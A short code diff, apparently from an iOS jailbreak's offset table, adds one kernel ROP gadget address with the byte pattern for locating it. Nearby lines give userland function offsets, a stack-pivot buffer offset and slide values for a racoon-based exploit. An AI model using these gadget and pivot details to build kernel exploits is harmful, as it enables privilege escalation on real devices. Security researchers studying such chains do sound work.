@@ -677,6 +677,8 @@ bool populate_offsets(offsets_t* liboffsets, offset_struct_t* offsets)
         liboffsets->userland_funcs.mach_msg                 = (void*)(0x18095bc38 + CACHE_DIFF); // dlsym of _mach_msg
         liboffsets->userland_funcs.posix_spawn              = (void*)(0x180976340 + CACHE_DIFF); // dlsym of _posix_spawn
 
+        liboffsets->vortex.rop_ldr_x0_x0_0x10               = 0xfffffff00627eb48; // search the kernel cache for 00 08 40 f9 c0 03 5f d6
+
         offsets->dns4_array_to_lcconf                       = 0x1000670e0 - (0x100067c10 + 0x8); // lcconf = "failed to set my ident: %s", value being offset by 0xb0 (0x6c on 32-bit), then isakmp_config_dns4 = subtract second reference of "No more than %d DNS", first adr in switch case 0x77, add 0x8
         offsets->str_buff_offset                            = 8; // based on the pivot gadget below (the x21 gadget will do a double deref based on specific value on a buffer we control so we need to know its offset)
         offsets->max_slide                                  = 0x4670000; // read 8 bytes at OFF_OLD_CACHE_ADDR + 0xf0
